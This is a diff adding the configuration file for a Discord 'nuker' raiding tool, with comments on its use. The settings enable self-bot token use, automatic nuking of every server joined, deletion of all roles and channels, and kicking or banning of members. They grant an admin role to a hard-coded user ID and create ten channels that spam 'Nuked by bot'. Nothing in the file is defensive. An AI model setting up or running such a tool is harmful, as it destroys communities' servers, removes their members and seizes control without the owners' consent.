@@ -1,0 +1,29 @@
+# DO NOT delete keys from this config file. Set them as false or, if array type, leave array empty
+guildID=""
+# If you want to self bot, just put your token here. if you want to use a bot, prepend your token with "Bot "
+token=""
+
+# If set to false, the nuker will not kick or ban any members, no matter the value of ban_members
+[feature_config]
+#  The auto nuke setting will make it so upon joining a server, the nuke will activate automatically
+# Auto nuke also gives the option to nuke all currently joined servers upon startup
+# This requires the program running persistently. The guildID property has no effect when auto nuke is enabled
+auto_nuke=true
+delete_roles=true
+# IDs of members who will be given an admin role. As a member cannot assign roles with permissions higher than their own role, this will make and assign a role with
+# the member permissions of the bot
+auto_admin=["911849994020085820"]
+delete_channels=true
+[feature_config.member_removal]
+enabled=true
+# If not set to true, it will kick members instead
+ban_members=false
+# IDs of Members who will not be removed
+exempt=[]
+# Create channels that you spam a message in after banning members
+[feature_config.after_channels]
+enabled=true
+message="Nuked by bot"
+channel_name="botnuke"
+message_repetitions=3
+channel_amount=10
